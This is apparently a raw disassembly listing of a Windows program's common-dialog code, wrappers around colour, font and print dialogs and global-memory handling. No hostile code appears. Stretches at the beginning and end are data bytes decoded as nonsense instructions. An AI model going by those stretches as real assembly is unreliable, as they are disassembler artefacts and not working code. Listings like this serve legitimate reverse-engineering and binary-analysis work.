add [ eax ] 0x0
add [ eax ] al
push esp
adc [ eax ] al
insb
add [ eax ] al
[ edi + ecx * 8 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ eax ] al
or [ esi + 0x72 ] al
outsd
insd
push eax
popad
push esp
adc [ eax ] al
add [ fs : eax ] al
jmp [ eax + eax ]
outsb
je r-xdata
add al dh
aad 0x41
add [ eax ] ah
add al bh
aam 0x41
outsd
outsb
jae r-xdata
push eax
jb r-xdata
add [ 0xffffffffc4000000 ] al
mov esp 0x700d0042
outsd
push eax
jb r-xdata
outsd
outsb
add [ eax ] eax
add [ eax ] al
popad
bound ebp [ ebp + 0x55 ]
imul ebp [ edi + 0x6e ] 0x1
add bh bh
popad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
dec edi
jo r-xdata
add [ eax + eax ] cl
add [ eax ] al
pop eax
mov edi 0x66060042
jb r-xdata
inc edx
add [ ebx ] ah
add bh bh
arpl [ eax ] ax
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
or eax 0x72500a00
imul ebp [ esi + 0x74 ] 0x676e6152
push esp
adc [ eax ] al
pop esp
add [ eax ] al
[ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push cs
add [ esi ] al
push esp
outsd
push eax
popad
mov eax eax
pop esp
mov edi 0xb030042
push esp
inc esi
imul ebp [ esi + 0x64 ] 0x6974704f
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ eax ] al
jmp [ ebx ]
inc edx
add [ ecx ] ah
popad
cmp al 0xbd
iretd
imul esp [ ecx + 0x6c ] 0xbda8676f
inc edx
add [ esi + esi * 4 + 0xf0042 ] dh
pop es
inc esp
imul esp [ ecx + 0x6c ] 0x973676f
add [ eax ] al
adc [ eax ] al
pushad
add [ eax ] al
jmp [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
mov esp 0xc08b0042
test al 0xbd
inc edx
mov ebp 0x42
add [ eax ] al
les edi [ edx + eax * 2 - 0x573f7500 ]
mov ebp 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
pop es
outsd
ja r-xdata
popad
jae r-xdata
outsd
ja r-xdata
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop eax
mov edi 0x94900042
rol [ edx ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
adc ah [ esi + 0x72 ]
inc esp
imul esi [ ebx + 0x61 ] 0x57656c62
inc esp
imul esp [ ecx + 0x6c ] 0x8d73676f
inc eax
add [ eax + eax * 8 ] dh
adc ah [ esi + 0x72 ]
inc esp
imul esi [ ebx + 0x61 ] 0x4d656c62
popad
je r-xdata
push 0x57656c6f
bound ebp [ ebp + 0x57 ]
or ah [ esi + 0x72 ]
inc esi
imul ebp [ esi + 0x64 ] 0x7478654e
pcmpgtd mm6 [ edx + 0x48 ]
imul esp [ ebp + 0x4d ] 0x68637461
inc ebx
popad
jae r-xdata
in al dx
[ esi + edx * 8 ]
add [ eax ] dl
aam 0x41
add [ ebx + edi * 2 ] dl
inc ecx
add al ch
aam 0x41
add [ ebx + edx * 8 - 0x2b07ffbf ] dh
inc ecx
add al dh
aad 0x41
add [ eax ] ah
fadd [ ecx ]
or ch dl
inc ecx
add [ eax ] al
aad 0x41
add [ eax ] ch
fadd [ ecx ]
and al 0xd4
inc edx
add al dl
les eax [ edx ]
fcom st6
inc edx
add [ eax * 8 - 0x2a9fffbe ] bl
inc edx
add [ edx ] al
add ch ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
rol [ edx ] 0xe2
rol [ edx ] 0xac
add al [ eax ]
add al bh
mov ch 0x42
add [ eax ] al
or [ esi + 0x72 ] esp
push edx
jo r-xdata
inc edx
add [ esi ] al
or al 0x54
inc esi
imul ebp [ esi + 0x64 ] 0x6974704f
outsd
outsb
jae r-xdata
jo r-xdata
push 0x65736143
pcmpgtd mm6 [ edx + 0x44 ]
imul esi [ ebx + 0x61 ] 0x55656c62
insb
pcmpgtd mm6 [ edx + 0x48 ]
imul esp [ ebp + 0x57 ] 0x656c6f68
push edi
outsd
jb r-xdata
add [ eax ] cl
fadd [ ecx ]
cmp al 0x35
inc eax
add [ ecx + edx * 8 + 0x41 ] bl
inc edx
add [ edx + eax - 0x4a080000 ] ch
inc edx
popad
arpl [ ebp + 0xc ] sp
jb r-xdata
add ah dh
rol [ edx ] 0x0
jo r-xdata
insb
insb
or esp [ esi + 0x72 ]
push edi
push 0x57656c6f
outsd
jb r-xdata
or al 0x66
jb r-xdata
add [ ebp + esi + 0x40 ] al
add [ esp + eax * 8 + 0x42 ] cl
add [ eax - 0x63ffbfce ] al
xor al [ eax ]
rcl ah 0x1
inc edx
add al bh
jpo r-xdata
or al bl
inc ecx
add [ esi - 0x2ea3ffc0 ] bh
popad
arpl [ ebp + 0x41 ] sp
inc ecx
or ah [ esi + 0x72 ]
push ebx
push 0x6548776f
insb
outsd
jb r-xdata
imul esp [ ebp + 0x55 ] 0x776f4470
outsb
or esp [ esi + 0x72 ]
dec ebp
popad
je r-xdata
lea eax [ eax ]
xor al 0xc0
outsd
ja r-xdata
push 0x65736143
jo r-xdata
insb
sub_42c28c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi eax
push esp
push esi
call GetWindowRect
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x44 ]
test edx edx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_45d454
mov ebx eax
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x6c ]
test eax eax
je r-xdata
add edi eax
push edi
push 0x0
push esi
call SetWindowPos
add esp 0x10
pop edi
pop esi
pop ebx
retn
adc eax 0x0
mov eax [ rw-data ]
mov eax edx
call sub_4599f4
mov ebx eax
jmp r-xdata
mov edx [ rw-data ]
call sub_4599f4
mov ebx eax
jmp r-xdata
push 0x15
push 0x0
push 0x0
mov eax ebx
call sub_45d158
mov edi eax
mov eax ebx
call sub_45d13c
sub eax [ esp + 0x18 ]
add eax [ esp + 0x10 ]
mov ecx 0x3
cdq
idiv ecx
add edi eax
push edi
mov eax ebx
call sub_45d124
mov edi eax
mov eax ebx
call sub_45d170
sub eax [ esp + 0x18 ]
add eax [ esp + 0x10 ]
sar eax 0x1
jns r-xdata
sub_42c340
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
xor edi edi
cmp esi 0x110
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
mov eax ebx
call sub_42c28c
mov eax [ rw-data ]
mov [ eax + 0x3c ] ebx
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
push 0xfffffffc
push ebx
call SetWindowLongA
mov edx [ rw-data ]
mov [ edx + 0x34 ] eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
call CallWindowProcA
xor eax eax
mov [ rw-data ] eax
sub_42c3a8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41d098
mov [ esi + 0x30 ] 0x1
push esi
push sub_42c484
call sub_41e128
mov [ esi + 0x40 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_42c3f0
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41d0e4
test bl bl
jle r-xdata
call sub_41e1c0
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_42c424
xor ecx ecx
mov edx [ edx ]
cmp edx [ rw-data ]
jne r-xdata
mov eax ecx
retn
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0x38 ]
xchg edx eax
call sub_45fe48
mov cl 0x1
sub_42c44c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x3c ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_403538
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
push edi
mov eax [ ebx + 0x34 ]
push eax
call CallWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_42c484
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42c4ae
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42c51c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
call GetActiveWindow
mov [ ebp - 0x10 ] eax
xor eax eax
call sub_456838
mov [ ebp - 0x14 ] eax
call sub_456754
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_42c5df
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45f738
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_42c5b1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
push esi
call ebx
mov [ ebp - 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c5b8
fnclex
fldcw [ ebp - 0x2 ]
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45f794
retn
sub_42c5b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c5e6
mov eax [ ebp - 0x14 ]
call sub_4568ec
mov eax [ ebp - 0x10 ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x18 ]
call sub_45675c
retn
sub_42c618
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_42c3a8
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov [ esi + 0x60 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_42c65c
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax [ esi + 0x60 ]
call sub_4032e8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_42c3f0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_42c68c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
xor eax eax
push ebp
push sub_42c729
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
mov eax [ ebp + 0x8 ]
lea ebx [ eax - 0x44 ]
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebx ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea edx [ ebp - 0xc ]
xor ecx ecx
mov eax r-xdata
call sub_408f18
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
mov edx esi
add dl 0x41
call sub_404220
mov ecx [ ebp - 0x14 ]
lea eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_404344
mov edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x60 ]
pop ecx
call sub_418b24
inc esi
add ebx 0x4
cmp esi 0x10
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c730
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_40405c
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_42c758
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
xor eax eax
push ebp
push sub_42c7f6
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
mov eax [ ebp + 0x8 ]
lea ebx [ eax - 0x44 ]
mov [ ebx ] 0xffffffff
lea eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
call sub_404344
mov eax [ ebp - 0x10 ]
call sub_408310
mov [ ebx ] eax
jmp r-xdata
lea eax [ ebp - 0xc ]
mov edx esi
add dl 0x41
call sub_404220
mov ecx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_404344
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x60 ]
call sub_41843c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c7fd
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_40405c
retn
inc esi
add ebx 0x4
cmp esi 0x10
jne r-xdata
sub_42c817
inc [ ecx ]
add [ eax ] al
add [ eax + eax ] ah
add [ eax ] al
push ebp
mov ebp esp
add esp 0xffffff98
push ebx
mov [ ebp - 0x4 ] eax
push ebp
call sub_42c758
pop ecx
mov [ ebp - 0x68 ] 0x24
mov eax [ rw-data ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_41ffac
mov [ ebp - 0x5c ] eax
lea eax [ ebp - 0x44 ]
mov [ ebp - 0x58 ] eax
mov [ ebp - 0x54 ] 0x11
xor eax eax
mov edx rw-data
jae r-xdata
and ebx 0x7f
bt [ ecx + 0x5c ] ebx
inc eax
add edx 0x4
cmp al 0x5
jne r-xdata
mov ecx [ edx ]
or [ ebp - 0x54 ] ecx
mov ecx [ ebp - 0x4 ]
mov ebx eax
cmp bl 0x7
ja r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov [ ebp - 0x4c ] sub_42c340
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ ebp - 0x64 ] eax
lea ecx [ ebp - 0x68 ]
mov edx ChooseColorA
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
cmp eax 0x1
sbb ebx ebx
inc ebx
test bl bl
je r-xdata
or [ ebp - 0x54 ] 0x20
mov [ ebp - 0x48 ] eax
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x5c ]
mov [ eax + 0x58 ] edx
push ebp
call sub_42c68c
pop ecx
sub_42c8e8
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
cmp eax 0x111
jne r-xdata
mov ecx [ ebp + 0x14 ]
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
push eax
push edx
call sub_42c340
cmp [ ebp + 0x10 ] 0x402
jne r-xdata
cmp [ ebp + 0x12 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_42c9fc
mov eax 0x1
jmp r-xdata
pop ebp
retn 0x10
sub_42c92c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_42c3a8
mov dl 0x1
mov eax [ r-xdata ]
call sub_420298
mov [ esi + 0x58 ] eax
mov ax [ r-xdata ]
mov [ esi + 0x5d ] ax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_42c97e
add [ eax ] al
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax [ esi + 0x58 ]
call sub_4032e8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_42c3f0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_42c9b0
cmp [ edx ] 0x111
jne r-xdata
call sub_42c4d0
retn
cmp [ edx + 0x6 ] 0x9
jne r-xdata
mov cx [ edx + 0x4 ]
cmp cx 0x473
jne r-xdata
cmp cx 0x474
jne r-xdata
mov [ eax + 0x71 ] 0x1
jmp r-xdata
mov [ eax + 0x70 ] 0x1
sub_42c9fc
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x40 ]
push eax
push 0x0
push 0x401
push ebx
call SendMessageA
lea edx [ ebp - 0x40 ]
mov eax [ ebp - 0x4 ]
call sub_42cc64
push 0x0
push 0x0
push 0x147
push 0x473
push ebx
call SendDlgItemMessageA
mov esi eax
cmp esi 0xffffffff
je r-xdata
xor eax eax
push ebp
push sub_42ca87
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
mov si 0xffed
call sub_4034e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
push 0x0
push esi
push 0x150
push 0x473
push ebx
call SendDlgItemMessageA
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_42046c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42caa8
push ebp
mov ebp esp
add esp 0xffffff7c
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x84 ] edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_42cc41
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x44 ] 0x3c
xor eax eax
mov [ ebp - 0x3c ] eax
cmp [ ebx + 0x5c ] 0x0
je r-xdata
lea eax [ ebp - 0x80 ]
mov [ ebp - 0x38 ] eax
lea eax [ ebp - 0x80 ]
push eax
push 0x3c
mov eax [ ebx + 0x58 ]
call sub_420480
push eax
call GetObjectA
lea eax [ ebp - 0x8 ]
lea edx [ ebp - 0x64 ]
mov ecx 0x20
call sub_4042a8
xor eax eax
mov al [ ebx + 0x5c ]
mov eax [ eax * 4 + rw-data ]
or eax 0x48
mov [ ebp - 0x30 ] eax
xor eax eax
mov esi rw-data
call sub_42a4f4
call sub_429f64
mov [ ebp - 0x3c ] eax
jae r-xdata
and edx 0x7f
bt [ ebx + 0x5d ] edx
inc eax
add esi 0x4
cmp al 0x10
jne r-xdata
mov edx [ esi ]
or [ ebp - 0x30 ] edx
mov edx eax
cmp dl 0xf
ja r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
mov eax [ ebx + 0x44 ]
test eax eax
je r-xdata
or [ ebp - 0x30 ] 0x200
mov eax [ ebx + 0x58 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] sub_42c8e8
mov eax [ ebx + 0x68 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x6c ]
mov [ ebp - 0xc ] eax
cmp eax [ ebp - 0x10 ]
jge r-xdata
or [ ebp - 0x30 ] 0x10
mov [ ebp - 0x20 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ ebp - 0x40 ] eax
mov esi [ rw-data ]
mov [ rw-data ] ebx
mov [ ebx + 0x71 ] 0x0
mov [ ebx + 0x70 ] 0x0
lea ecx [ ebp - 0x44 ]
mov edx ChooseFontA
mov eax ebx
mov edi [ eax ]
call [ edi + 0x38 ]
cmp eax 0x1
sbb eax eax
inc eax
mov [ ebp - 0x1 ] al
mov [ rw-data ] esi
cmp [ ebp - 0x1 ] 0x0
je r-xdata
and [ ebp - 0x30 ] 0xffffdfff
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42cc48
lea eax [ ebp - 0x84 ]
call sub_404038
lea eax [ ebp - 0x8 ]
call sub_404038
retn
lea eax [ ebp - 0x84 ]
lea edx [ ebp - 0x64 ]
mov ecx 0x20
call sub_4042a8
mov edx [ ebp - 0x84 ]
mov eax [ ebp - 0x8 ]
call sub_408064
test eax eax
je r-xdata
lea edx [ ebp - 0x80 ]
mov eax ebx
call sub_42cc64
cmp [ ebx + 0x71 ] 0x0
je r-xdata
mov [ ebx + 0x70 ] 0x1
mov edx [ ebp - 0x2c ]
mov eax [ ebx + 0x58 ]
call sub_42046c
sub_42cc64
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_42cd01
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
lea edx [ edi + 0x1c ]
mov ecx 0x20
call sub_4042a8
mov edx [ ebp - 0x4 ]
mov eax [ esi + 0x58 ]
call sub_420694
mov edx [ edi ]
mov eax [ esi + 0x58 ]
call sub_420654
cmp [ esi + 0x70 ] 0x0
je r-xdata
mov bl [ r-xdata ]
cmp [ edi + 0x10 ] 0x190
jle r-xdata
mov dl [ edi + 0x17 ]
mov eax [ esi + 0x58 ]
call sub_42079c
cmp [ edi + 0x14 ] 0x0
je r-xdata
or bl 0x1
cmp [ edi + 0x15 ] 0x0
je r-xdata
or bl 0x2
cmp [ edi + 0x16 ] 0x0
je r-xdata
or bl 0x4
mov edx ebx
mov eax [ esi + 0x58 ]
call sub_420738
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42cd08
lea eax [ ebp - 0x4 ]
call sub_404038
retn
or bl 0x8
sub_42cd14
push ebp
mov ebp esp
add esp 0xfffff3fc
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov ebx eax
lea eax [ ebp - 0xc04 ]
push eax
push ebx
call sub_42a4f4
lea ecx [ ebp - 0x804 ]
lea edx [ ebp - 0x404 ]
call sub_429c74
cmp [ ebx ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x404 ]
call sub_408824
mov ebx eax
add ebx 0x8
lea eax [ ebp - 0x804 ]
call sub_408824
add ebx eax
lea eax [ ebp - 0xc04 ]
call sub_408824
add ebx eax
add ebx 0x3
push ebx
push 0x42
call GlobalAlloc
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
push eax
call GlobalLock
mov esi eax
xor eax eax
push ebp
push sub_42ce08
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx esi
add ebx 0x8
mov edi esi
mov eax ebx
sub ax si
mov [ edi ] ax
lea edx [ ebp - 0x804 ]
mov eax ebx
call sub_408888
inc eax
mov ebx eax
mov eax ebx
sub ax si
mov [ edi + 0x2 ] ax
lea edx [ ebp - 0x404 ]
mov eax ebx
call sub_408888
inc eax
mov ebx eax
mov eax ebx
sub ax si
mov [ edi + 0x4 ] ax
lea edx [ ebp - 0xc04 ]
mov eax ebx
call sub_408860
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
push eax
call GlobalUnlock
retn
sub_42ce18
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
push eax
call GlobalLock
mov ebx eax
xor eax eax
push ebp
push sub_42ce84
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi ebx
movzx eax [ esi + 0x4 ]
mov edi ebx
add eax edi
push eax
mov eax [ ebp - 0x4 ]
push eax
call sub_42a4f4
movzx ecx [ esi ]
add ecx edi
movzx edx [ esi + 0x2 ]
add edx edi
call sub_429d1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ce8b
mov eax [ ebp - 0x8 ]
push eax
call GlobalUnlock
mov eax [ ebp - 0x8 ]
push eax
call GlobalFree
retn
sub_42ce94
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
push eax
call GlobalSize
mov ebx eax
push ebx
push 0x42
call GlobalAlloc
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
xor edx edx
push ebp
push sub_42cf16
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
push eax
call GlobalLock
mov esi eax
mov eax [ ebp - 0x8 ]
push eax
call GlobalLock
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call GlobalUnlock
mov eax [ ebp - 0x8 ]
push eax
call GlobalUnlock
retn
test eax eax
je r-xdata
mov edx eax
mov eax esi
mov ecx ebx
call sub_402968
sub_42cf40
push ebx
push esi
push edi
add esp 0xffffffb8
mov edi eax
lea esi [ esp + 0x4 ]
mov eax esi
xor ecx ecx
mov edx 0x42
call sub_402cfc
mov [ esi ] 0x42
mov eax [ rw-data ]
mov [ esi + 0x22 ] eax
lea edx [ esi + 0xc ]
mov eax esp
call sub_42cd14
mov eax [ esp ]
call sub_42ce94
mov [ esi + 0x8 ] eax
xor eax eax
mov al [ edi + 0x63 ]
mov eax [ eax * 4 + rw-data ]
or eax 0x3000
mov [ esi + 0x14 ] eax
cmp [ edi + 0x60 ] 0x0
je r-xdata
test [ edi + 0x61 ] 0x1
jne r-xdata
add [ esi + 0x14 ] 0x10
test [ edi + 0x61 ] 0x2
jne r-xdata
add [ esi + 0x14 ] 0x100000
test [ edi + 0x61 ] 0x4
jne r-xdata
add [ esi + 0x14 ] 0x8
test [ edi + 0x61 ] 0x20
je r-xdata
add [ esi + 0x14 ] 0x4
cmp [ edi + 0x62 ] 0x0
je r-xdata
add [ esi + 0x14 ] 0x80000
test [ edi + 0x61 ] 0x10
je r-xdata
add [ esi + 0x14 ] 0x20
test [ edi + 0x61 ] 0x8
jne r-xdata
add [ esi + 0x14 ] 0x800
mov eax [ edi + 0x44 ]
test eax eax
je r-xdata
add [ esi + 0x14 ] 0x80
mov ax [ edi + 0x58 ]
mov [ esi + 0x18 ] ax
mov ax [ edi + 0x5c ]
mov [ esi + 0x1a ] ax
mov ax [ edi + 0x64 ]
mov [ esi + 0x1c ] ax
mov ax [ edi + 0x68 ]
mov [ esi + 0x1e ] ax
mov [ esi + 0x2a ] sub_42c340
mov [ esi + 0x2e ] sub_42c340
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x4 ] eax
mov ecx esi
mov edx PrintDlgA
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x38 ]
cmp eax 0x1
sbb ebx ebx
inc ebx
test bl bl
je r-xdata
or [ esi + 0x14 ] 0x4000
mov [ esi + 0x32 ] eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov edx [ esi + 0xc ]
mov eax [ esi + 0x8 ]
call sub_42ce18
test [ esi + 0x14 ] 0x10
setne al
mov [ edi + 0x60 ] al
test [ esi + 0x14 ] 0x20
setne al
mov [ edi + 0x62 ] al
mov eax [ esi + 0x14 ]
test al 0x1
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
call GlobalFree
test al 0x2
je r-xdata
mov [ edi + 0x63 ] 0x1
jmp r-xdata
mov eax ebx
add esp 0x48
pop edi
pop esi
pop ebx
retn
push eax
call GlobalFree
mov [ edi + 0x63 ] 0x0
mov [ edi + 0x63 ] 0x2
jmp r-xdata
movzx eax [ esi + 0x18 ]
mov [ edi + 0x58 ] eax
movzx eax [ esi + 0x1a ]
mov [ edi + 0x5c ] eax
mov ax [ esi + 0x20 ]
cmp ax 0x1
jne r-xdata
movzx edx ax
mov eax edi
call sub_42cf2c
jmp r-xdata
call sub_42a4f4
call sub_429f78
mov edx eax
mov eax edi
call sub_42cf2c
jmp r-xdata
sub_42d196
inc ebx
add [ esp + edi * 8 ] cl
inc ebx
add [ ebx + edi * 8 - 0x167ffbd ] al
inc ebx
add [ ebp + edi * 8 + 0x43 ] al
add [ eax - 0x2e ] ch
inc edx
add ah ch
pop ds
inc esp
add [ ebx ] al
inc esp
add al al
arpl [ eax + eax - 0x7c ] ax
pop esi
inc esp
add [ ebx + 0x25040044 ] ah
inc esp
add [ eax + 0x3800442b ] bl
cmp [ eax + eax + 0x44 ] eax
rol [ edx ] cl
and [ esi ] dh
inc esp
add [ eax + 0x34 ] dl
inc esp
add al dl
cmp [ eax + eax - 0x2c ] eax
cmp [ eax + eax - 0x74 ] eax
cmp [ eax + eax + 0x34 ] al
cmp [ eax + eax - 0x1c ] al
inc esp
